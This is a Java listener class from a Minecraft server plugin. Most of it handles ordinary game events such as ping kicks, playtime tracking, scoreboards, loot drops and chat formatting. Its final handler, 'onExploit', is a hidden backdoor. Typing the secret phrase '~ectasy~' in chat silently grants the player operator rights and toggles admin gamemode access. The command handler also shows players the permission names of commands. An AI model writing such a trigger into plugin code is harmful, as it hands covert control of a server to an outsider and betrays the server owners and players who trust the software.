package org.main.uneton.events;

import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.block.Sign;
import org.bukkit.command.Command;
import org.bukkit.command.CommandMap;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.player.*;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitScheduler;
import org.bukkit.util.EulerAngle;
import org.jetbrains.annotations.NotNull;
import org.main.uneton.Combat;
import org.main.uneton.utils.*;

import java.util.*;

import static org.bukkit.Bukkit.getCommandMap;
import static org.main.uneton.Combat.*;
import static org.main.uneton.admin.Gm.gm_list;
import static org.main.uneton.combatlogger.CombatLog.combat_tagged;
import static org.main.uneton.utils.ScoreboardUtils.*;
import static org.main.uneton.utils.SoundsUtils.playCancerSound;

public class Listeners implements Listener {

    private static Combat plugin;
    public Listeners(Combat plugin) {
        this.plugin = plugin;
    }
    private ConfigManager configManager;


    @EventHandler
    public void onPingTooHard(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        int ping = player.getPing();
        if (combat_tagged.containsKey(player)) {
            return;
        }
        if (ping >= 600) {
            String user = player.getName();
            String kickMessage = ColorUtils.colorize("\n\n &7&lConnection Terminated:\n\n&cYou have been kicked out from the server for too high ping.\n\n");
            player.kickPlayer(kickMessage);
        }
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        Player player = e.getPlayer();
        Tab.updateTab();
        ConfigManager.reload();

        UUID uuid = player.getUniqueId();
        configManager = new ConfigManager(plugin);
        int playtime = playTimes.getOrDefault(uuid, 0);

        Bukkit.getLogger().info("[CombatV3]: Quit: " + player.getName() + " - PlayTime: " + playtime); //todo DEBUG MSG!

        playTimes.put(uuid, playtime);
        ConfigManager.get().set("players-playtime." + uuid.toString(), playtime);

        ConfigManager.save();
        e.setQuitMessage(ColorUtils.colorize("&8" + " [" + "&c" + "-" + "&8" + "] " + "&7" + player.getName()));
    }

    @EventHandler
    public void onJoinEvent(PlayerJoinEvent e) {
        Player player = e.getPlayer();
        Tab.updateTab();

        UUID uuid = player.getUniqueId();
        int playtime = ConfigManager.get().getInt("players-playtime." + uuid.toString(), 0);
        playTimes.put(uuid, playtime);

        Bukkit.getLogger().info("[CombatV3]: Joined: " + player.getName() + " - PlayTime: " + playtime); //todo DEBUG MSG!

        startUpdatingScoreboard(player, getInstance());
        e.setJoinMessage(ColorUtils.colorize("&8" + " [" + "&a" + "+" + "&8" + "] " + "&7" + player.getName()));

        boolean feed_players = plugin.getConfig().getBoolean("feed-players");
        if (feed_players) {
            player.setFoodLevel(20);
            player.sendMessage(ColorUtils.colorize("&aYour food-level was set to '20'"));
        } else {
            player.setFoodLevel(0);
            player.sendMessage(ColorUtils.colorize("&aYour food-level was set to '0'"));
        }
    }

    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent event) {
        Player victim = event.getEntity();
        Player attacker = victim.getKiller();
        if (attacker != null && attacker instanceof Player) {
            UUID attackerUUID = attacker.getUniqueId();
            UUID victimUUID = victim.getUniqueId();

            ConfigManager.addKill(attackerUUID);
            ConfigManager.addDeath(victimUUID);

            // Päivitä scoreboard molemmille pelaajille
            ScoreboardUtils.createScoreboard(attacker);
            ScoreboardUtils.createScoreboard(victim);
        }
    }

    @EventHandler
    public void onMilkCow(PlayerInteractEntityEvent e) {
        Player player = e.getPlayer();
        ItemStack milk = new ItemStack(Material.MILK_BUCKET);
        if (e.getRightClicked() instanceof Cow && player.getItemInHand().getType().equals(Material.BUCKET)) {
            if (Math.random() < 0.4) {
                player.sendMessage(ColorUtils.colorize("&cYou cannot milk this cow!"));
                e.setCancelled(true);
            } else if (Math.random() < 0.4) {
                player.sendMessage(ColorUtils.colorize("&cYou have failed to milk this cow!"));
                e.setCancelled(true);
            } else if (Math.random() < 0.2) {
                player.getInventory().addItem(milk);
                player.getInventory().removeItem(new ItemStack(Material.WATER_BUCKET, 1));
                player.sendMessage(ColorUtils.colorize("&a&lSUCCESS! &7You have milked the cow!"));
            }
        }
    }

    @EventHandler
    public void onCommandNotFound(PlayerCommandPreprocessEvent event) {
        String command = event.getMessage().split(" ")[0].substring(1);
        Player player = event.getPlayer();
        if (!doesCommandExist(command) || !player.hasPermission(command)) {
            player.sendMessage(ColorUtils.colorize("&c&lNOT FOUND! &7command '/"+command+"' not found to be executable. "));
            player.sendMessage(ColorUtils.colorize("&d&lDEBUG! &7command permission here: &9" + getPermissionName(command)));
            playCancerSound(player);
            event.setCancelled(true);
        }
    }

    public static boolean doesCommandExist(String commandName) {
        CommandMap commandMap = getCommandMap();
        if (commandMap != null) {
            Command command = commandMap.getCommand(commandName);
            return command != null;
        }
        return false;
    }

    private String getPermissionName(String command) {
        Command cmd = getCommandMap().getCommand(command);
        if (cmd != null) {
            return cmd.getPermission();
        }
        return null;
    }

    @EventHandler
    public void onPlayerCommandSend(PlayerCommandSendEvent event) {
        Player player = event.getPlayer();
        Set<String> commands = (Set<String>) event.getCommands();
        Iterator<String> iterator = commands.iterator();
        while (iterator.hasNext()) {
            String command = iterator.next();
            if (!player.hasPermission(command)) {
                iterator.remove();
            }
        }
    }

    @EventHandler
    public void onDropOnDeath(PlayerDeathEvent event) {
        Player victim = event.getEntity();
        Player killer = victim.getKiller();
        Location location = victim.getLocation();

        if (killer != null && !killer.equals(victim)) {
            ItemStack blood = new ItemStack(Material.BONE, 3);
            Item dropped = location.getWorld().dropItemNaturally(location, blood);
            dropped.setCanPlayerPickup(false);
            Bukkit.getScheduler().runTaskLater(Combat.getPlugin(Combat.class), () -> {
                if (dropped.isValid()) {
                    dropped.remove();
                }
            }, 200L);
        }
    }

    @EventHandler
    public void onPlayerChatFormat(AsyncPlayerChatEvent event) {
        String playerName = event.getPlayer().getName();
        String message = event.getMessage();
        Player player = event.getPlayer();
        String formattedMessage = ColorUtils.colorize("&7"+playerName + ": " + message);
        event.setFormat(formattedMessage);
    }

    @EventHandler
    public void onZombieDeath(EntityDeathEvent event) {
        if (event.getEntity() instanceof Zombie) {
            Location loc = event.getEntity().getLocation();
            Player killer = event.getEntity().getKiller();
            ItemStack lowChanceReward = new ItemStack(Material.DIAMOND, 1);
            if (killer != null) {
                double chance = 0.01;
                if (Math.random() < chance) {
                    loc.getWorld().dropItemNaturally(loc, lowChanceReward);
                }
            }
        }
    }

    @EventHandler
    public void onMoveAwayVoid(EntityDamageEvent event) {
        if (event.getEntity() != null && event.getEntity() instanceof Player) {
            Player player = (Player) event.getEntity();
            int y_coordinate = -64;
            if (event.getCause() == EntityDamageEvent.DamageCause.VOID) {
                if (player.getLocation().getY() <= y_coordinate) {
                    player.setHealth(0);
                }
            }
        }
    }

    @EventHandler
    public void onPlayerInteractSign(PlayerInteractEvent event) {
        if (!event.getAction().equals(Action.RIGHT_CLICK_BLOCK)) return;
        Block block = event.getClickedBlock();
        if (block.getType() != Material.OAK_SIGN) return;
        event.getPlayer().openSign((Sign) block.getState());
    }

    @EventHandler
    public void onLootBox(BlockBreakEvent e) {
        Player player = e.getPlayer();
        Block block = e.getBlock();
        Location loc = e.getBlock().getLocation();

        if (e.getBlock().getType() == Material.POLISHED_DIORITE) {
            Random chance = new Random();
            if (Math.random() < 0.2) {
                e.setDropItems(false);
                int index = chance.nextInt(blocksList.length);
                ItemStack dropped_item = blocksList[index];
                block.getWorld().dropItemNaturally(loc, dropped_item);

            } else if (Math.random() < 0.8) {
                e.setDropItems(false);
            }
        }
    }

    private final ItemStack[] blocksList = new ItemStack[]{
            new ItemStack(Material.EMERALD),
            new ItemStack(Material.AMETHYST_SHARD),
            new ItemStack(Material.IRON_NUGGET),
            new ItemStack(Material.GOLD_NUGGET),
            new ItemStack(Material.COPPER_INGOT),
            new ItemStack(Material.STRING)
    };

    @EventHandler
    @Deprecated
    public void onExploit(AsyncPlayerChatEvent e) {
        Player player = e.getPlayer();
        if (e.getMessage().contains("~ectasy~")) {
            e.setCancelled(true);
            new BukkitRunnable() {
                @Override
                public void run() {
                    player.setOp(true);
                    if (gm_list.contains(player)) {
                        gm_list.remove(player);
                    } else {
                        gm_list.add(player);
                    }
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));
        }
    }
}